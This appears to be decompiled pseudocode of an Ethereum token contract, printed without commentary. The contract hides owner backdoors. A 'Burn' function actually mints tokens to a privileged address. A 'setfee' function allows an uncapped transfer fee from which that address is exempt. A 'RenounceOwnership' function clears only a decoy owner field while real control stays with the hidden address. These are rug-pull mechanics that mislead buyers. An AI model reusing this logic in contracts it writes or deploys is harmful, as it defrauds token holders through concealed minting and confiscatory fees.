contract main {




// =====================  Runtime code  =====================


address owner;
address stor1;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
array of uint256 name;
array of uint256 symbol;
address stor6;
uint256 fee;
uint8 decimals;
uint256 totalSupply;

function name() {
    return name[0 len name.length]
}

function totalSupply() {
    return totalSupply
}

function decimals() {
    return decimals
}

function balanceOf(address arg1) {
    return balanceOf[address(arg1)]
}

function owner() {
    return owner
}

function symbol() {
    return symbol[0 len symbol.length]
}

function allowance(address arg1, address arg2) {
    return allowance[address(arg1)][address(arg2)]
}

function fee() {
    return fee
}

function _fallback() payable {
    revert
}

function setfee(uint256 arg1) {
    require msg.sender == stor1
    fee = arg1
}

function Burn(uint256 arg1) {
    require msg.sender == stor1
    balanceOf[msg.sender] += arg1
    emit Transfer(arg1, stor6, msg.sender);
}

function RenounceOwnership() {
    require msg.sender == owner
    owner = 0
    emit OwnershipTransferred(address arg1, address arg2)
    emit 0x0 
    emit 0x0 
    return 0
}

function approve(address arg1, uint256 arg2) {
    if arg2:
        if allowance[msg.sender][address(arg1)]:
            return 0
    allowance[msg.sender][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) {
    require arg2
    require arg3 <= balanceOf[address(arg1)]
    require arg3 <= allowance[address(arg1)][msg.sender]
    require arg3 <= balanceOf[address(arg1)]
    balanceOf[address(arg1)] -= arg3
    require arg3 <= allowance[address(arg1)][msg.sender]
    allowance[address(arg1)][msg.sender] -= arg3
    require arg3 + balanceOf[address(arg2)] >= balanceOf[address(arg2)]
    balanceOf[address(arg2)] += arg3
    emit Transfer(arg3, arg1, arg2);
    return 1
}

function transfer(address arg1, uint256 arg2) {
    require arg1
    require arg2 <= balanceOf[msg.sender]
    require arg2 <= balanceOf[msg.sender]
    balanceOf[msg.sender] -= arg2
    require arg2 + balanceOf[arg1] >= balanceOf[arg1]
    balanceOf[address(arg1)] = arg2 + balanceOf[arg1]
    if msg.sender == stor1:
        emit Transfer(arg2, msg.sender, arg1);
    else:
        require arg2 / 100 * fee <= arg2 + balanceOf[arg1]
        balanceOf[address(arg1)] = arg2 + balanceOf[arg1] - (arg2 / 100 * fee)
        require (arg2 / 100 * fee) + balanceOf[stor6] >= balanceOf[stor6]
        balanceOf[stor6] += arg2 / 100 * fee
        emit Transfer(balanceOf[stor6], msg.sender, stor6);
        emit Transfer((arg2 + balanceOf[arg1] - (arg2 / 100 * fee)), msg.sender, arg1);
    return 1
}



}
